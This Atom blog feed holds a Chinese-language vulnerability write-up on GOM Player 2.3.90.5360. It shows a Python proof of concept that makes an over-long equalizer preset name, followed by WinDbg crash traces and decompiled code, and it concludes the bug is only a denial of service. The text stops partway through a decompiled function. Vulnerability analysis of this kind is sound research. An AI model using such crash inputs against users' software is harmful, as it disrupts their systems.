<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>z1r0&#39;s blog</title>
  
  
  <link href="https://www.z1r0.top/atom.xml" rel="self"/>
  
  <link href="https://www.z1r0.top/"/>
  <updated>2024-07-16T10:05:30.924Z</updated>
  <id>https://www.z1r0.top/</id>
  
  <author>
    <name>z1r0</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>GOM Player 2.3.90.5360 - Buffer Overflow</title>
    <link href="https://www.z1r0.top/2024/07/06/GOM-Player-2-3-90-5360-Buffer-Overflow/"/>
    <id>https://www.z1r0.top/2024/07/06/GOM-Player-2-3-90-5360-Buffer-Overflow/</id>
    <published>2024-07-06T09:33:40.000Z</published>
    <updated>2024-07-16T10:05:30.924Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>GOM Player（Gretech Online Movie Player）是韩国的GRETECH开发的一款在Windows平台上的免费媒体播放器</p><p>软件下载：<a href="https://github.com/z1r00/Vulnerability_Analysis/tree/main/GOM_Player">https://github.com/z1r00/Vulnerability_Analysis/tree/main/GOM_Player</a></p><p>Poc：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">exploit = <span class="string">'A'</span> * <span class="number">260</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    file = <span class="built_in">open</span>(<span class="string">"exploit.txt"</span>,<span class="string">"w"</span>)</span><br><span class="line">    file.write(exploit)</span><br><span class="line">    file.close()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"POC is created"</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"POC is not created"</span>)</span><br></pre></td></tr></tbody></table></figure><p>触发：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#  - Open GOM Player</span><br><span class="line">#  - Click on the gear icon above to open settings</span><br><span class="line">#  - From the meu that appears, select Audio</span><br><span class="line">#  - Click on Equalizer</span><br><span class="line">#  - Click on the plus sign to go to the "Add EQ preset" screen</span><br><span class="line">#  - Copy the contents of exploit.txt and paste it into the preset name box, then click OK</span><br><span class="line">#  - Crashed!</span><br></pre></td></tr></tbody></table></figure><p>这个洞进行深入分析之后发现其实并不是真正意义上的Buffer Overflow，是wcscpy_s函数检测到了错误而主动抛出了异常，目前看来只能当作一个拒绝服务漏洞（bug）</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>此漏洞是由于在添加均衡器预设名称时，当输入的内容大于等于预设名称空间，wcscpy_s检测到当目标缓存区大小无法容纳源字符串时，wcscpy_s函数将主动抛出异常，导致程序崩溃。目标缓存区大小这里是二参传进去的大小，用法是wcscpy_s(wchar_t *Destination, rsize_t SizeInWords, const wchar_t *Source)</p><p>用windbg启动程序，执行GOM.exe，将Poc添加到均衡器预设名称时发生崩溃，windbg此时处于crash现场</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(219c.2778): Security check failure or stack buffer overrun - code c0000409 (!!! second chance !!!)</span><br><span class="line">Subcode: 0x5 FAST_FAIL_INVALID_ARG </span><br><span class="line">eax=00000001 ebx=0b1f0f70 ecx=00000005 edx=00000000 esi=00000022 edi=0b1f0f70</span><br><span class="line">eip=00ee71de esp=01afecc8 ebp=01afece0 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202</span><br><span class="line">GOM32Q_vc120_ReleaseQC+0x6371de:</span><br><span class="line">00ee71de cd29            int     29h</span><br></pre></td></tr></tbody></table></figure><p>它断在了_invoke_watson中，回溯堆栈状态</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; kb</span><br><span class="line"> # ChildEBP RetAddr      Args to Child              </span><br><span class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</span><br><span class="line">00 01afece0 00ee71cc     00000000 00000000 00000000 GOM32Q_vc120_ReleaseQC+0x6371de</span><br><span class="line">01 01afed04 00ab6a63     01afee0c 00000104 0b1fb610 GOM32Q_vc120_ReleaseQC+0x6371cc</span><br><span class="line">02 01aff058 00a9d040     0b1f39a0 00000001 00db723a GOM32Q_vc120_ReleaseQC+0x206a63</span><br><span class="line">03 01aff11c 00db82e2     0104b640 0b1f39a0 00010004 GOM32Q_vc120_ReleaseQC+0x1ed040</span><br><span class="line">04 01aff13c 00db392f     0000c2f8 0b1f39a0 00010004 GOM32Q_vc120_ReleaseQC+0x5082e2</span><br><span class="line">05 01aff1ac 00db40ea     0b1f0f70 00050672 0000c2f8 GOM32Q_vc120_ReleaseQC+0x50392f</span><br><span class="line">06 01aff1cc 753a16eb     00050672 0000c2f8 0b1f39a0 GOM32Q_vc120_ReleaseQC+0x5040ea</span><br><span class="line">07 01aff1f8 75397b3a     00db40b6 00050672 0000c2f8 USER32!_InternalCallWinProc+0x2b</span><br><span class="line">08 01aff2e0 75396471     00db40b6 00000000 0000c2f8 USER32!UserCallWinProcCheckWow+0x33a</span><br><span class="line">09 01aff35c 75395f90     0000c1f8 01aff398 00dbc591 USER32!DispatchMessageWorker+0x4d1</span><br><span class="line">0a 01aff368 00dbc591     01ec8cd8 00000000 01aff41c USER32!DispatchMessageW+0x10</span><br><span class="line">0b 01aff398 00db2c90     00000004 00060046 01aff41c GOM32Q_vc120_ReleaseQC+0x50c591</span><br><span class="line">0c 01aff3b0 00db2dbb     011d2660 057b64a0 008b0000 GOM32Q_vc120_ReleaseQC+0x502c90</span><br><span class="line">0d 01aff408 009977b2     f571782c 057b64a0 fffffffe GOM32Q_vc120_ReleaseQC+0x502dbb</span><br><span class="line">0e 01aff54c 00c02467     00000006 0000001b ffffffff GOM32Q_vc120_ReleaseQC+0xe77b2</span><br><span class="line">0f 01aff56c 00db9d9e     057b64a0 0000041f 00000000 GOM32Q_vc120_ReleaseQC+0x352467</span><br><span class="line">10 01aff59c 00db5f0e     0000041f 010776f0 00000000 GOM32Q_vc120_ReleaseQC+0x509d9e</span><br><span class="line">11 01aff5ec 00c03f1d     0000041f 00000000 f5717a38 GOM32Q_vc120_ReleaseQC+0x505f0e</span><br><span class="line">12 01aff678 00db6afb     0000041f 00000000 f5717b08 GOM32Q_vc120_ReleaseQC+0x353f1d</span><br><span class="line">13 01aff730 00db82e2     00000111 0000041f 00000000 GOM32Q_vc120_ReleaseQC+0x506afb</span><br><span class="line">14 01aff750 00db392f     00000111 0000041f 00000000 GOM32Q_vc120_ReleaseQC+0x5082e2</span><br><span class="line">15 01aff7c0 00db40ea     057b64a0 00060046 00000111 GOM32Q_vc120_ReleaseQC+0x50392f</span><br><span class="line">16 01aff7e0 753a16eb     00060046 00000111 0000041f GOM32Q_vc120_ReleaseQC+0x5040ea</span><br><span class="line">17 01aff80c 75397b3a     00db40b6 00060046 00000111 USER32!_InternalCallWinProc+0x2b</span><br><span class="line">18 01aff8f4 753972f6     00db40b6 00000000 00000111 USER32!UserCallWinProcCheckWow+0x33a</span><br><span class="line">19 01aff92c 75395b1b     00000111 0000041f 00000000 USER32!CallWindowProcAorW+0x7f</span><br><span class="line">1a 01aff944 009e9a45     00db40b6 00060046 00000111 USER32!CallWindowProcW+0x1b</span><br><span class="line">1b 01aff9ec 753a16eb     00060046 00000111 0000041f GOM32Q_vc120_ReleaseQC+0x139a45</span><br><span class="line">1c 01affa18 75397b3a     009e97c0 00060046 00000111 USER32!_InternalCallWinProc+0x2b</span><br><span class="line">1d 01affb00 75396471     009e97c0 00000000 00000111 USER32!UserCallWinProcCheckWow+0x33a</span><br><span class="line">1e 01affb7c 75395f90     00000011 01affbb4 00dbc591 USER32!DispatchMessageWorker+0x4d1</span><br><span class="line">1f 01affb88 00dbc591     01ec8cd8 00000001 011a17e0 USER32!DispatchMessageW+0x10</span><br><span class="line">20 01affbb4 00f0f850     00ed7d98 0000000a 00000000 GOM32Q_vc120_ReleaseQC+0x50c591</span><br><span class="line">21 01affbc8 00ed7d1e     008b0000 00000000 01ec25da GOM32Q_vc120_ReleaseQC+0x65f850</span><br><span class="line">22 01affc14 764afcc9     0196e000 764afcb0 01affc80 GOM32Q_vc120_ReleaseQC+0x627d1e</span><br><span class="line">23 01affc24 770280ce     0196e000 648bdd27 00000000 KERNEL32!BaseThreadInitThunk+0x19</span><br><span class="line">24 01affc80 7702809e     ffffffff 77049189 00000000 ntdll!__RtlUserThreadStart+0x2f</span><br><span class="line">25 01affc90 00000000     00ed7d98 0196e000 00000000 ntdll!_RtlUserThreadStart+0x1b</span><br></pre></td></tr></tbody></table></figure><p><code>00ab6a63</code>是漏洞点地址，刚好是wcscpy_s函数，<code>0b1fb610</code>存放了输入的Poc</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dc 0b1fb610</span><br><span class="line">0b1fb610  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">0b1fb620  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">0b1fb630  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">0b1fb640  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">0b1fb650  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">0b1fb660  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">0b1fb670  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">0b1fb680  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">0:000&gt; du 0b1fb610</span><br><span class="line">0b1fb610  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><br><span class="line">0b1fb650  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><br><span class="line">0b1fb690  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><br><span class="line">0b1fb6d0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><br><span class="line">0b1fb710  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><br><span class="line">0b1fb750  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><br><span class="line">0b1fb790  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><br><span class="line">0b1fb7d0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><br><span class="line">0b1fb810  "AAAA"</span><br></pre></td></tr></tbody></table></figure><p>利用wcscpy_s复制过去之后的数据存放在<code>01afee0c</code>中，很明显的发现头这里是空字节</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dc 01afee0c</span><br><span class="line">01afee0c  00410000 00410041 00410041 00410041  ..A.A.A.A.A.A.A.</span><br><span class="line">01afee1c  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">01afee2c  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">01afee3c  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">01afee4c  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">01afee5c  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">01afee6c  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">01afee7c  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br></pre></td></tr></tbody></table></figure><p>wcscpy_s的函数实现如下，循环复制，直到Source结尾（SizeInWords不为0）或SizeInWords为0。如果SizeInWords不为0，则说明到了Source结尾可以正常返回。如果为0，则说明Source的长度大于等于SizeInWords，将Destination的头数据设置为0并抛出异常，所以上面的<code>01afee0c</code>会出现头字节为0的情况</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">errno_t</span> __cdecl <span class="title">wcscpy_s</span><span class="params">(<span class="type">wchar_t</span> *Destination, <span class="type">rsize_t</span> SizeInWords, <span class="type">const</span> <span class="type">wchar_t</span> *Source)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="type">rsize_t</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">wchar_t</span> *v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> *v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">errno_t</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">wchar_t</span> v7; <span class="comment">// ax</span></span><br><span class="line">  <span class="type">errno_t</span> v8; <span class="comment">// [esp-4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !Destination )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  v3 = SizeInWords;</span><br><span class="line">  <span class="keyword">if</span> ( !SizeInWords )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  v4 = Source;</span><br><span class="line">  <span class="keyword">if</span> ( !Source )</span><br><span class="line">  {</span><br><span class="line">    *Destination = <span class="number">0</span>;</span><br><span class="line">LABEL_5:</span><br><span class="line">    v5 = _errno();</span><br><span class="line">    v8 = <span class="number">22</span>;</span><br><span class="line">LABEL_6:</span><br><span class="line">    *v5 = v8;</span><br><span class="line">    _invalid_parameter_noinfo();</span><br><span class="line">    <span class="keyword">return</span> v8;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  {</span><br><span class="line">    v7 = *v4;</span><br><span class="line">    *(v4 + Destination - Source) = *v4;</span><br><span class="line">    ++v4;</span><br><span class="line">    <span class="keyword">if</span> ( !v7 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    --v3;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">while</span> ( v3 );</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">  {</span><br><span class="line">    *Destination = <span class="number">0</span>;</span><br><span class="line">    v5 = _errno();</span><br><span class="line">    v8 = <span class="number">34</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里有个非常明显问题，如果限制大小是0x104，刚好输入符合要求的0x104也会抛出异常。对于本案例，允许输入的大小大于等于0x104，所以只要大于等于0x104都会抛出异常让程序崩溃</p><p>经过调试之后发现，在均衡器预设这里会进入sub_6077E0函数进行表项判断</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; t</span><br><span class="line">eax=012e1678 ebx=0a80ff58 ecx=0a80ff58 edx=00000001 esi=7fffffff edi=7fffffff</span><br><span class="line">eip=00d477e0 esp=004fecec ebp=004fedac iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200293</span><br><span class="line">GOM32Q_vc120_ReleaseQC+0x2077e0:</span><br><span class="line">00d477e0 55              push    ebp</span><br></pre></td></tr></tbody></table></figure><p>利用sub_90A38F获取表项ID，+号的表项ID为0x00004b1</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; </span><br><span class="line">eax=00000001 ebx=0a80ff58 ecx=0a90bf90 edx=00000000 esi=0a90bf90 edi=0a80ff58</span><br><span class="line">eip=00d47806 esp=004fece0 ebp=004fece8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246</span><br><span class="line">GOM32Q_vc120_ReleaseQC+0x207806:</span><br><span class="line">00d47806 e8842b3000      call    GOM32Q_vc120_ReleaseQC+0x50a38f (0104a38f)</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=000004b1 ebx=0a80ff58 ecx=00000000 edx=00000000 esi=0a90bf90 edi=0a80ff58</span><br><span class="line">eip=00d4780b esp=004fece0 ebp=004fece8 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200206</span><br><span class="line">GOM32Q_vc120_ReleaseQC+0x20780b:</span><br><span class="line">00d4780b 2db1040000      sub     eax,4B1h</span><br></pre></td></tr></tbody></table></figure><p>根据表项ID执行对应的操作，+号会去执行sub_606910</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __thiscall <span class="title">sub_6077E0</span><span class="params">(HWND *<span class="keyword">this</span>, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &amp;&amp; <span class="built_in">IsWindow</span>(*(a2 + <span class="number">32</span>)) &amp;&amp; a3 == <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    v4 = <span class="built_in">sub_90A38F</span>(a2) - <span class="number">1201</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">        <span class="built_in">sub_606BD0</span>(<span class="keyword">this</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">sub_606910</span>(<span class="keyword">this</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在sub_606910中，首先进行初始化，load_window显示对话框并进行添加修改选择，将选择的操作作为返回值返回(v3)。操作状态为100是添加预设，101是修改预设</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; p</span><br><span class="line">eax=00000018 ebx=0c003a38 ecx=76fb1cfc edx=00000000 esi=00000064 edi=0c003a38</span><br><span class="line">eip=00ab6a01 esp=0086eac8 ebp=0086ee08 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246</span><br><span class="line">GOM32Q_vc120_ReleaseQC+0x206a01:</span><br><span class="line">00ab6a01 83fe64          cmp     esi,64h</span><br></pre></td></tr></tbody></table></figure><p>进入添加预设功能时，会将输入的数据转到Source中，并利用wcscpy_s将数据复制到Destination中，并没有对输入数据的大小进行检测限制</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __thiscall <span class="title">sub_606910</span><span class="params">(<span class="type">void</span> *<span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *v6; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *v10; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">wchar_t</span> *v12; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">wchar_t</span> *Source; <span class="comment">// [esp+10h] [ebp-324h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v15[<span class="number">43</span>]; <span class="comment">// [esp+14h] [ebp-320h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp+C0h] [ebp-274h]</span></span><br><span class="line">  <span class="type">wchar_t</span> Destination[<span class="number">260</span>]; <span class="comment">// [esp+F4h] [ebp-240h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v18[<span class="number">40</span>]; <span class="comment">// [esp+2FCh] [ebp-38h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [esp+330h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (dword_CF83C4 &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">  {</span><br><span class="line">    dword_CF83C4 |= <span class="number">1u</span>;</span><br><span class="line">    dword_CF83C8 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">atexit</span>(nullsub_8);</span><br><span class="line">    v19 = <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  (*(*dword_CF83C8 + <span class="number">56</span>))(dword_CF83C8);</span><br><span class="line">  <span class="built_in">sub_646A00</span>(v15, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, v2);</span><br><span class="line">  v19 = <span class="number">1</span>;</span><br><span class="line">  v3 = <span class="built_in">load_window</span>(v15);</span><br><span class="line">  <span class="keyword">if</span> ( (dword_CF83C4 &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">  {</span><br><span class="line">    dword_CF83C4 |= <span class="number">1u</span>;</span><br><span class="line">    <span class="built_in">LOBYTE</span>(v19) = <span class="number">2</span>;</span><br><span class="line">    dword_CF83C8 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">atexit</span>(nullsub_8);</span><br><span class="line">    <span class="built_in">LOBYTE</span>(v19) = <span class="number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  (*(*dword_CF83C8 + <span class="number">64</span>))(dword_CF83C8);</span><br><span class="line">  <span class="keyword">if</span> ( v3 == <span class="string">'d'</span> )</span><br><span class="line">  {</span><br><span class="line">    v4 = v16;</span><br><span class="line">    <span class="keyword">if</span> ( v16 || (<span class="built_in">sub_646D00</span>(v15), (v4 = v16) != <span class="number">0</span>) )</span><br><span class="line">    {</span><br><span class="line">      v5 = v4 - <span class="number">116</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v5 )</span><br><span class="line">      {</span><br><span class="line">        <span class="built_in">sub_44A540</span>(&amp;Source, *(v5 + <span class="number">144</span>));</span><br><span class="line">        <span class="built_in">LOBYTE</span>(v19) = <span class="number">3</span>;</span><br><span class="line">        <span class="built_in">wcscpy_s</span>(Destination, <span class="number">0x104</span>u, Source);</span><br><span class="line">        <span class="built_in">sub_5CE090</span>(v18);</span><br><span class="line">        v6 = *(<span class="built_in">sub_7B4DC0</span>(&amp;dword_CF1C10, Destination) + <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="built_in">sub_90A3AA</span>(<span class="keyword">this</span>, <span class="number">1301</span>) + <span class="number">180</span>) == <span class="number">1</span> )</span><br><span class="line">          v7 = <span class="number">-1</span>;</span><br><span class="line">        <span 